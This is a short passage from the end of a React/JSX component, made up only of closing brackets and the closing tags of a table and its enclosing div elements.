                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};
